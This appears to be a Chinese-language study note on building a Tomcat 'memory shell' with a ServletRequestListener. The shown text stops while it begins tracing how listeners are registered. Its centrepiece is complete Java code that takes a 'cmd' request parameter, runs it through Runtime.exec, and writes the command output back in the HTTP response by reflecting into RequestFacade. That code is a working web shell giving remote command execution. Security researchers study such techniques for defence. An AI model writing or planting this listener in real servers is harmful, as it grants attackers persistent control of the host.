# Listener
Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。
## Listener三个域对象
- ServletContextListener
- HttpSessionListener
- ServletRequestListener

很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面我们来实现一个恶意的 Listener

# 恶意Listener构造
要实现一个 Listener 必须实现 EventListener 接口
![](picture/Pasted%20image%2020260105231709.png)
很多接口继承了EventListener，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener
我们去寻找的时候一定是优先找 **Servlet** 开头的类
这里我找到了 ServletRequestListener ，因为根据名字以及其中的 requestInitialized 方法感觉我们的发送的每个请求都会触发这个监控器

有了猜想之后就可以先开始实践了，编写一个简单的 demo 来进行测试
写一个Listener
```java
package demo.tomcat;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
  
public class SerVlertListener implements ServletRequestListener {  
    public SerVlertListener() {  
        super();  
    }  
  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println("requestInitialized!");  
  
    }  
}
```
在web.xml里把我们的Linstener注册进去
```xml
<listener>  
    <listener-class>demo.tomcat.SerVlertListener</listener-class>  
</listener>
```
# 流程分析
- 流程分析的意义是让我们能够正确的写入恶意的内存马，具体要解决的其实有以下两个问题：

1、 我们的恶意代码应该在哪儿编写？  
2、 Tomcat 中的 Listener 是如何实现注册的？

## 恶意代码在哪写？
### 方法一：在`requestInitialized()`中写
第一个问题现在我们已经想到一种显而易见的方法
写在刚刚的`requestInitialized()`里
```java
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println("requestInitialized!");  
  
    }  
```
在 Listener 这里提供了 ServletRequestEvent 类型的参数，从名字可推测出为 Servlet请求事件

我们思考
- 用户发送 `?cmd=ls` 给服务器。
- Tomcat 接收到请求，心想：“有个请求进来了，我得通知监听器。”
- Tomcat 把这个请求打包成一个 `ServletRequestEvent` (即 `sre`)，然后调用`requestInitialized(sre)`。

那我们想办法把请求的对象从 `ServletRequestEvent sre`这个传入的参数中拿出来，然后在`requestInitialized()`种写入我们的木马，传入我们刚刚拿的对象，这样就可以执行命令，并且有回显了。

ok我们先解决第一步，拿到我们传入的get参数或者post传参。所以我们需要寻找 sre 的一个方法来获取到请求对象。

通过IDEA的自动补全功能可以帮我们找到`getServletRequest`（感觉这个技巧还挺巧，学到了）
![](picture/Pasted%20image%2020260105235208.png)
当然，源码也很简单，直接看都一样。
可以看到该方法返回的是 ServletRequest 接口的实现类，那么具体是哪个实现类呢，我们直接调试一下就知道了
![](picture/Pasted%20image%2020260105235335.png)

```java
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String name = sre.getServletRequest().getClass().getName();
        System.out.println(name);
        System.out.println("requestInitialized");
    }
```
这样就行了
![](picture/Pasted%20image%2020260105235647.png)
`org.apache.catalina.connector.RequestFacade`可以看到是这个类，我们去看看
ok这里的request是 Request类的我们去看看
![](picture/Pasted%20image%2020260105235956.png)
在这里我们可以看到，这里就是包含我们请求也就是 `Request+Response`
![](picture/Pasted%20image%2020260106000817.png)

ok，那我们直接反射获取 `RequestFacade`的那个request属性，就能拿到存放我们请求和回复的对象 Response了。

```java
package demo.tomcat;  
  
import javax.servlet.ServletRequest;  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import java.io.InputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
  
public class SerVlertListener implements ServletRequestListener {  
    public SerVlertListener() {  
        super();  
    }  
  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
  
    }  
  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        String cmd = sre.getServletRequest().getParameter("cmd");//拿到传参  
        ServletRequest requestfacade = sre.getServletRequest();//拿到requestfacade类  
        try {  
            Field requestField = requestfacade.getClass().getDeclaredField("request");  
            requestField.setAccessible(true);  
            Object ObjectRequest = requestField.get(requestfacade);//拿到存放请求内容的对象  
  
            Method getResponseMethod = ObjectRequest.getClass().getMethod("getResponse");//拿其中的回复对象，为了回显  
            Object ObjectResponse = getResponseMethod.invoke(ObjectRequest);  
            //再获取ObjectResponse的 Writer 以便写出数据  
            java.io.PrintWriter writer = (java.io.PrintWriter) ObjectResponse.getClass().getMethod("getWriter").invoke(ObjectResponse);  
            //命令执行  
            if (cmd != null) {  
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                java.util.Scanner s = new java.util.Scanner(inputStream).useDelimiter("\\A");  
                String output = s.hasNext() ? s.next() : "";  
                // 6. 使用我们“偷”出来的 writer 将结果写回浏览器  
                writer.write(output);  
                writer.flush();  
            }  
  
        } catch (Exception e) {  
            throw new RuntimeException(e);  
        }  
  
    }  
}
```
![](picture/Pasted%20image%2020260106004603.png)
呼~完美。
## Tomcat 中的 Listener 是如何实现注册的？
这里我们想办法找Listener注册的流程，
我们在我们自己的listener中打一个断点，看看调用栈
![](picture/Pasted%20image%2020260106204605.png)
















